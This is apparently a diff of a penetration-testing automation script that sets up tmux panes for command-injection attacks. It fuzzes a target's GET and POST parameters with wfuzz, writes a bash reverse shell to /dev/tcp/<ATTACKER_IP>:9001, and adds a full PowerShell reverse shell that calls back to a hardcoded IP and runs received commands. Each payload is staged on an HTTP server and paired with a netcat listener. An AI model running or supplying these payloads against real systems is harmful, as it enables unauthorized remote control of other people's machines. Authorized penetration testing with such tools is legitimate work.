@@ -3234,12 +3234,18 @@ tmux send-keys -t PT:4.5"# command injection automation (GET)" Enter
 tmux send-keys -t PT:4.5 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
 tmux send-keys -t PT:4.6 "# command injection automation (POST)" Enter
 tmux send-keys -t PT:4.6 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
-tmux send-keys -t PT:4.7"# command injection automation: save revShell for linux in shell file" Enter
+tmux send-keys -t PT:4.7"# command injection automation for Linux: save revShell for linux in shell file" Enter
 tmux send-keys -t PT:4.7 "echo \"/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1\" > shell"
-tmux send-keys -t PT:4.8"# command injection automation: activate HTTP server" Enter
-tmux send-keys -t PT:4.8 "python3 -m http.server"
-tmux send-keys -t PT:4.9"# command injection automation: listener" Enter
+tmux send-keys -t PT:4.8"# command injection automation for Linux: activate HTTP server" Enter
+tmux send-keys -t PT:4.8 "python3 -m http.server 80"
+tmux send-keys -t PT:4.9"# command injection automation for Linux: listener" Enter
 tmux send-keys -t PT:4.9 "nc -nlvp 9001"
+tmux send-keys -t PT:4.10"# command injection automation for Windows: save revShell for windows in shellWin file" Enter
+tmux send-keys -t PT:4.10 'echo '\''$LHOST = "192.168.1.102"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'\'' > shellWin' C-m
+tmux send-keys -t PT:4.11"# command injection automation for Windows: activate HTTP server" Enter
+tmux send-keys -t PT:4.11 "python3 -m http.server 80"
+tmux send-keys -t PT:4.12 "# command injection automation for Windows: listener" Enter
+tmux send-keys -t PT:4.12 "nc -nlvp 9001"
 cd $folderProject
 
 
